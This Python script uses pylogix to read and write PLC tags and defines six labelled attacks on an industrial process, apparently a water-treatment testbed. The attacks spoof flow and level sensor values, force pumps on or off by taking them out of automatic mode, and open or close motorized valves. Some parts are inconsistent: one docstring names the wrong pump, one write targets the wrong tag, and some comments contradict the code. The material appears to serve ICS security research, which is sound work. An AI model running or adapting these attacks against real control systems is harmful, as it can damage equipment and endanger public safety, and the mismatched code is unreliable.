import time
from pylogix import PLC
import random

PLC_IPS = {
    'plc1': '192.168.1.10',
    'plc2': '192.168.1.20',
    'plc3': '192.168.1.30',
    'plc4': '192.168.1.40',
    'plc5': '192.168.1.50',
    'plc6': '192.168.1.60',
    'plc1r': '192.168.1.11',
    'plc2r': '192.168.1.21',
    'plc3r': '192.168.1.31',
    'plc4r': '192.168.1.41',
    'plc5r': '192.168.1.51',
    'plc6r': '192.168.1.61',
    'scada': '192.168.1.211'
}

dtypes = {
    "STRUCT": 160,
    "BOOL": 193,
    "SINT": 194,
    "INT": 195,
    "DINT": 196,
    "LINT": 197,
    "USINT": 198,
    "UINT": 199,
    "UDINT": 200,
    "LWORD": 201,
    "REAL": 202,
    "LREAL": 203,
    "DWORD": 211,
    "STRING": 218
}


def discover_devices():
    with PLC() as comm:
        devices = comm.Discover()
    for device in devices.Value:
        print(device.IPAddress)
        print('  Product Code: ' + device.ProductName + ' ' + str(device.ProductCode))
        print('  Vendor/Device ID:' + device.Vendor + ' ' + str(device.DeviceID))
        print('  Revision/Serial:' + device.Revision + ' ' + device.SerialNumber)
        print('')


def plc_write(plc_ip, tag_name, value, dtype=None):
    with PLC() as comm:
        comm.IPAddress = plc_ip
        comm.Write(tag_name, value, datatype=dtype)


def plc_multi_write(plc_ip, tag_list):
    '''
    Example of tag_list:
    write_data = [('tag1', 100),
                  ('tag2', 6.45),
                  ('tag3', True)]
    '''
    with PLC() as comm:
        comm.IPAddress = plc_ip
        ret = comm.Write(tag_list)

        for r in ret:
            print(r.TagName, r.Status)


def plc_read(plc_ip, tag_name, dtype=None):
    with PLC() as comm:
        comm.IPAddress = plc_ip
        ret = comm.Read(tag_name, datatype=dtype)
        print(ret.Value)
        return ret.Value


def plc_multi_read(plc_ip, tag_list):
    with PLC() as comm:
        comm.IPAddress = plc_ip
        ret = comm.Read(tag_list)
        for r in ret:
            print(r.TagName, r.Value)


def get_all_tags(plc_ip):
    with PLC() as comm:
        comm.IPAddress = plc_ip
        tags = comm.GetTagList()
        return tags


def get_control_tags(plc_ip):
    with PLC() as comm:
        comm.IPAddress = plc_ip
        tags = comm.GetTagList(False)
        return tags


'''START OF ATTACKS'''


def start_attack(number):
    """
    Prints string to show attack is starting.
    """
    print('-' * 50)
    print(f'Attack {number} launched')
    print('-' * 50)


def end_attack(number):
    """
    Prints string to show attack has ended after 5 seconds.
    """
    time.sleep(5)
    print('-' * 50)
    print(f'Attack {number} finished')
    print('-' * 50)


def attack_1():
    """
    Attack on FIT401: Spoof value from 0.8 to 0.5
    """
    start_attack(1)
    plc_write(PLC_IPS['plc4'], 'HMI_FIT401.Pv', True, dtypes['BOOL'])
    try:
        level = plc_read(PLC_IPS['plc4'], 'HMI_FIT401.Pv')
        plc_write(PLC_IPS['plc4'], 'HMI_FIT401.Pv', level, dtypes['REAL'])
        level = 0.5
        plc_write(PLC_IPS['plc4'], 'HMI_FIT401.Pv', level, dtypes['REAL'])

        end_attack(1)

    except KeyboardInterrupt:
        print('Attack stopped by user!')
        original_level = plc_read(PLC_IPS['plc4'], 'HMI_FIT401.Pv')
        plc_write(PLC_IPS['plc4'], 'HMI_FIT401.Pv', original_level, dtypes['REAL'])


def attack_2():
    """
    Attack on LIT301: Spoof Value from 835 to 1024
    """
    start_attack(2)
    plc_write(PLC_IPS['plc3'], 'LIT301.Sim', True, dtypes['BOOL'])

    try:
        level = plc_read(PLC_IPS['plc3'], 'LIT301.Pv')
        plc_write(PLC_IPS['plc3'], 'LIT301.Sim_Pv', level, dtypes['REAL'])
        level = 1024
        plc_write(PLC_IPS['plc3'], 'LIT301.Sim_Pv', level, dtypes['REAL'])

    except KeyboardInterrupt:
        print('Attack stopped by user!')
        original_level = plc_read(PLC_IPS['plc3'], 'LIT301.Pv')
        plc_write(PLC_IPS['plc3'], 'LIT301.Sim_Pv', original_level, dtypes['REAL'])


def attack_3():
    """
    Attack on P601: Switch from OFF to ON
    """
    start_attack(3)
    P301 = plc_read(PLC_IPS['plc3'], 'P301.Cmd')
    print('Pump Status:', P301[0])

    try:
        plc_write(PLC_IPS['plc3'], 'P301.Auto', 0, dtypes['BOOL'])
        plc_write(PLC_IPS['plc3'], 'P301.Cmd', 2, dtypes['INT'])
        print('Starting Pump')

    except KeyboardInterrupt:
        print('Attack stopped by user!')
        plc_write(PLC_IPS['plc3'], 'P301.Auto', 1, dtypes['BOOL'])


def attack_4():
    """
    Multi-point Attack: Switch from CLOSE to OPEN (MV201) and OFF to ON (P101)
    """
    start_attack(4)
    try:
        # Checks status of MV201
        MV201 = plc_read(PLC_IPS['plc2'], 'HMI_MV201.Cmd')
        print('Valve status:', MV201)

        # Open MV201 permanently
        if MV201[0] == 1:
            plc_write(PLC_IPS['plc2'], 'HMI_MV201.Auto', 0, dtypes['BOOL'])
            plc_write(PLC_IPS['plc2'], 'HMI_MV201.Cmd', 2, dtypes['INT'])
            print('MV201 closed')
        else:
            print('MV201 already open!')

        # Checks status of P101
        P101 = plc_read(PLC_IPS['plc1'], 'HMI_P101.Cmd')
        print('P101 status:', P101)

        # Keep P101 permanently ON
        plc_write(PLC_IPS['plc1'], 'HMI_P101.Auto', 0, dtypes['BOOL'])
        if P101[0] == 1:
            plc_write(PLC_IPS['plc1'], 'HMI_P301.Cmd', 2, dtypes['INT'])
        else:
            print('P101 is already on!')

        end_attack(4)

    except KeyboardInterrupt:
        print('Attack stopped by user!')
        plc_write(PLC_IPS['plc2'], 'HMI_MV201.Auto', 1, dtypes['BOOL'])
        plc_write(PLC_IPS['plc1'], 'HMI_P101.Auto', 1, dtypes['BOOL'])


def attack_5():
    """
    Attack on MV501: Switch from OPEN to CLOSE
    """
    start_attack(5)
    try:
        # Checks status of MV501
        MV501 = plc_read(PLC_IPS['plc5'], 'HMI_MV501.Cmd')
        print('Valve status:', MV501)

        # Open MV501 permanently
        if MV501[0] == 1:
            plc_write(PLC_IPS['plc5'], 'HMI_MV501.Auto', 0, dtypes['BOOL'])
            plc_write(PLC_IPS['plc5'], 'HMI_MV501.Cmd', 2, dtypes['INT'])
            print('MV501 closed')
        else:
            print('MV501 already open!')

        end_attack(5)

    except KeyboardInterrupt:
        print('Attack stopped by user!')
        plc_write(PLC_IPS['plc5'], 'HMI_MV501.Auto', 1, dtypes['BOOL'])


def attack_6():
    """
    Attack on P301: Switch from ON to OFF
    """
    start_attack(6)
    try:
        # Checks status of P301
        P301 = plc_read(PLC_IPS['plc3'], 'HMI_P301.Cmd')
        print('P301 status:', P301)

        # Keep P301 permanently OFF
        plc_write(PLC_IPS['plc3'], 'HMI_P301.Auto', 0, dtypes['BOOL'])
        if P301[0] == 2:
            plc_write(PLC_IPS['plc3'], 'HMI_P301.Cmd', 1, dtypes['INT'])
        else:
            print('P301 is already off!')

        end_attack(6)

    except KeyboardInterrupt:
        print('Attack stopped by user!')
        plc_write(PLC_IPS['plc3'], 'HMI_P301.Auto', 1, dtypes['BOOL'])


def main():
    """
    Attacks
    """
    # discover_devices()
    get_all_tags('192.168.1.10')


if __name__ == '__main__':
    main()
